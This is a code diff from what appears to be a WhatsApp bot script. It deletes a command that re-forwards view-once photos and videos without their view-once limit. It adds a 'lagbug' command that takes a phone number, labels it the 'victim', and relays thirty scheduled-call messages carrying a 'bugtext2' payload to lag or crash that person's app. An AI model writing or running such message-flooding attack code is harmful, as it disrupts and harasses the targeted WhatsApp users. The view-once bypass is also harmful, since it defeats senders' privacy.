@@ -755,46 +755,46 @@ if (responses.hasOwnProperty(smallinput)) {
 
 //
     switch (command) {
-
-
-      //
-      /*
-      case 'vv': {
-      if (isBan) return reply(mess.banned)
-      If (isBanChat) return reply(mess.bangc)
-      If (!isCreator) return reply(mess.useradmin)
-      A17.sendMessage(from, { react: { text: "🖼️" , key: m.key }})
-      If (!quoted) return reply('You have not tag a view once message🙁')
-      const quot = citel.msg.contextInfo.quotedMessage.viewOnceMessageV2;
-if(quot)
-{
-if(quot.message.imageMessage)
-{ console.log("Quot Entered")
-   let cap =quot.message.imageMessage.caption;
-   let anu = await Void.downloadAndSaveMediaMessage(quot.message.imageMessage)
-   return Void.sendMessage(citel.chat,{image:{url : anu},caption : cap })
-}
-if(quot.message.videoMessage)
-{
-   let cap =quot.message.videoMessage.caption;
-   let anu = await Void.downloadAndSaveMediaMessage(quot.message.videoMessage)
-   return Void.sendMessage(citel.chat,{video:{url : anu},caption : cap })
-}
-
-} 
-      break;
-      }
-      */
-      case 'vv': {
-       if (!isCreator) return reply(mess.useradmin);
-       if (isBanChat) return reply(mess.bangc);
-	A17.sendMessage(from, { react: { text: "🦄" , key: m.key }})
-       if (!quoted) return await reply('_Reply to a viewOnce image or video_')
-       if (budy !== 'viewOnceMessage') return await reply('_Reply to a viewOnce image or video_')
-       await A17.forwardMessage(m.chat, quoted, { viewOnce: false })
-      }
-      break;
-
+		    
+      case "lagbug":
+        {
+          if (!IsCreator) return reply(mess.useradmin);
+          if (!args[0])
+            return reply(
+              `Use ${prefix + command} number\nExample ${
+                prefix + command
+              } 2349031616504`
+            );
+          victim = text.split("|")[0] + "@s.whatsapp.net";
+          amount = "30";
+          for (let i = 0; i < amount; i++) {
+            const makinobug = bugtext2;
+            var scheduledCallCreationMessage = generateWAMessageFromContent(
+              from,
+              proto.Message.fromObject({
+                scheduledCallCreationMessage: {
+                  callType: "2",
+                  scheduledTimestampMs: `${moment(1000)
+                    .tz("Africa/Lagos")
+                    .format("DD/MM/YYYY HH:mm:ss")}`,
+                  title: bugtext2,
+                },
+              }),
+              { userJid: from, quoted: m }
+            );
+            A17.relayMessage(
+              victim,
+              scheduledCallCreationMessage.message,
+              { messageId: scheduledCallCreationMessage.key.id }
+            );
+            await sleep(3000);
+          }
+        }
+        reply(
+          `*Successfully sent Bug To ${victim} Please pause for 3 minutes*`
+        )
+    }
+        break;
 		    
       case 'sc': case 'script': case 'sourcecode': {
         if (isBan) return reply(mess.banned);	 			
